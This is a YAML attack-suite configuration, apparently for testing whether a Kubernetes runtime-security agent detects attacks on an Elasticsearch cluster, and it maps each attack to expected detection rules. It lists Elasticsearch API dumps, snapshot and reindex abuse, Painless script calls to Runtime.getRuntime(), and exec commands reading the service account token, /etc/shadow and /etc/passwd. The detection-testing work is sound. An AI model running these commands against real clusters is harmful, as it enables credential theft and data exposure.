apiVersion: bobctl.k8sstormcenter.io/v1alpha1
kind: AttackSuite
metadata:
  name: elk-attacks
  description: >-
    Attack suite for the Elastic stack. Targets the Elasticsearch REST API
    to exercise security-relevant behaviors that node-agent should detect:
    unexpected process execution, sensitive file access, data exfiltration
    via API, and cluster manipulation.

    Elasticsearch runs as a Java process (OpenJDK) in the ECK-managed container.
    The attack surface is the unauthenticated REST API on port 9200.
target:
  service: el-es-http
  namespace: elk
  port: 9200

attacks:
  # --- Data exfiltration via API ---

  - name: exfil-cluster-settings
    type: ssrf
    http:
      method: GET
      path: /_cluster/settings?include_defaults=true&flat_settings=true
    successIndicators:
      - statusCode: 200

  - name: exfil-all-indices
    type: ssrf
    http:
      method: GET
      path: /_cat/indices?v&h=index,docs.count,store.size
    successIndicators:
      - statusCode: 200

  - name: exfil-mapping-dump
    type: ssrf
    http:
      method: GET
      path: /_all/_mapping
    successIndicators:
      - statusCode: 200

  # --- Dangerous cluster manipulation ---

  - name: snapshot-repo-create
    type: ssrf
    http:
      method: PUT
      path: /_snapshot/exfil-repo
      headers:
        Content-Type: application/json
      body: '{"type":"fs","settings":{"location":"/tmp/exfil-snapshot"}}'
    successIndicators:
      - statusCode: 200
      - statusCode: 500

  - name: reindex-exfil
    type: ssrf
    http:
      method: POST
      path: /_reindex
      headers:
        Content-Type: application/json
      body: '{"source":{"index":"*","size":1},"dest":{"index":"bobctl-exfil-test"}}'
    successIndicators:
      - statusCode: 200
      - statusCode: 400

  # --- Scripting abuse (Painless) ---

  - name: painless-script-exec
    type: cmdinject
    http:
      method: POST
      path: /bobctl-attack-test/_search
      headers:
        Content-Type: application/json
      body: >-
        {
          "query": {
            "script_score": {
              "query": {"match_all": {}},
              "script": {
                "source": "Runtime rt = Runtime.getRuntime(); return 1"
              }
            }
          }
        }
    successIndicators:
      - statusCode: 200
      - statusCode: 400
      - statusCode: 500

  - name: painless-runtime-field
    type: cmdinject
    http:
      method: POST
      path: /bobctl-attack-test/_search
      headers:
        Content-Type: application/json
      body: >-
        {
          "runtime_mappings": {
            "evil_field": {
              "type": "keyword",
              "script": "emit(doc['_id'].value + '_' + params._source.toString())"
            }
          },
          "fields": ["evil_field"],
          "query": {"match_all": {}}
        }
    successIndicators:
      - statusCode: 200
      - statusCode: 400

  # --- Exec attacks (post-exploitation) ---

  - name: exec-whoami
    type: cmdinject
    exec:
      command: ["whoami"]

  - name: exec-sa-token
    type: cmdinject
    exec:
      command: ["cat", "/var/run/secrets/kubernetes.io/serviceaccount/token"]

  - name: exec-etc-shadow
    type: cmdinject
    exec:
      command: ["cat", "/etc/shadow"]

  - name: exec-etc-passwd
    type: cmdinject
    exec:
      command: ["cat", "/etc/passwd"]

  - name: exec-drifted-binary
    type: cmdinject
    exec:
      command: ["sh", "-c", "cp /bin/ls /tmp/drifted_elk && /tmp/drifted_elk /etc; rm -f /tmp/drifted_elk"]

  - name: exec-env-dump
    type: cmdinject
    exec:
      command: ["env"]

expectedDetections:
  - attackType: cmdinject
    ruleID: R0001
    ruleName: "Unexpected process launched"
    command: whoami

  - attackType: cmdinject
    ruleID: R0001
    ruleName: "Unexpected process launched"
    command: cat

  - attackType: cmdinject
    ruleID: R0010
    ruleName: "Unexpected Sensitive File Access"
    command: cat

  - attackType: cmdinject
    ruleID: R1001
    ruleName: "Drifted process executed"
    command: drifted_elk
